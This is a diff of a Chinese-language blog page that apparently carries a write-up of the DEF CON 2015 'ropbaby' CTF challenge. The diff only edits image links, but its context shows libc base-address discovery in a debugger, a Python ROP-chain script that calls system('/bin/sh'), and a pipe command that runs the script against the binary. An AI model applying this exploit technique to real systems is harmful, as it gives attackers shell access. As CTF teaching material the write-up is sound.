@@ -103,8 +103,8 @@
 <meta property="og:image" content="http://yoursite.com/images/defcon2015_14.png">
 <meta property="og:image" content="http://yoursite.com/images/defcon2015_15.png">
 <meta property="og:image" content="http://yoursite.com/images/defcon2015_16.png">
-<meta property="og:image" content="http://yoursite.com/images">
-<meta property="og:updated_time" content="2018-08-06T06:24:39.261Z">
+<meta property="og:image" content="http://yoursite.com/images/defcon2015_20.png">
+<meta property="og:updated_time" content="2018-08-06T06:27:00.061Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="defcon 2015 ropbaby detailed Analysis">
 <meta name="twitter:description" content="缓冲区溢出">
@@ -394,7 +394,7 @@
 <h3 id="再次验证程序功能1所提供地址"><a href="#再次验证程序功能1所提供地址" class="headerlink" title="再次验证程序功能1所提供地址"></a>再次验证程序功能1所提供地址</h3><p><img src="/images/defcon2015_12.png" alt="image"><br>执行完功能1，Ctrl+c进入调试器 ， 然后输入info proc map找出libc基址，相当于用 cat /proc/pid/maps<br><img src="/images/defcon2015_13.png" alt="image"><br>加载libc的实际地址是 0x7ffff7dee000:”\177ELF\002\001\001\003”<br><img src="/images/defcon2015_14.png" alt="image"><br>在Linux系统上，基地址的前4个字节通常是“\x7fELF”或“\x7f\x45\x4c\x46”验证下是否一致，一致．<br><img src="/images/defcon2015_15.png" alt="image"><br>程序功能1原来程序功能1提供的是个指向实际的 libc 基地址 0x00007ffff7dee000<br><img src="/images/defcon2015_16.png" alt="image"></p>
 <h2 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">libc_base_addr = 0x00007ffff7dee000</span><br><span class="line">system_offset = 0x00000000000435d0</span><br><span class="line">binsh_offset = 0x0017f573</span><br><span class="line">pop_rdi_ret_offset = 0x000224df</span><br><span class="line"></span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">binsh_addr = libc_base_addr + binsh_offset</span><br><span class="line">pop_rdi_ret_addr = libc_base_addr + pop_rdi_ret_offset</span><br><span class="line"></span><br><span class="line">print &quot;3&quot;   # Option 3: Load ROP CHAIN</span><br><span class="line">print 32    # Size: 32 bytes</span><br><span class="line">print struct.pack(&quot;LLLL&quot;, 0x00AAAAAAAA, pop_rdi_ret_addr, binsh_addr, system_addr)</span><br><span class="line">py=struct.pack(&quot;LLLL&quot;, 0x00AAAAAAAA, pop_rdi_ret_addr, binsh_addr, system_addr)</span><br><span class="line">print repr(py)</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; ./gadget.py; cat -;&#125; | ./ropbaby</span><br></pre></td></tr></table></figure>
-<p><img src="/images" alt="image"></p>
+<p><img src="/images/defcon2015_20.png" alt="image"></p>
 <h2 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h2><p>savedregs是一个IDA关键字，表示保存的堆栈帧指针和函数返回地址：<br>radare2调试<br>IDA分析</p>
 
       
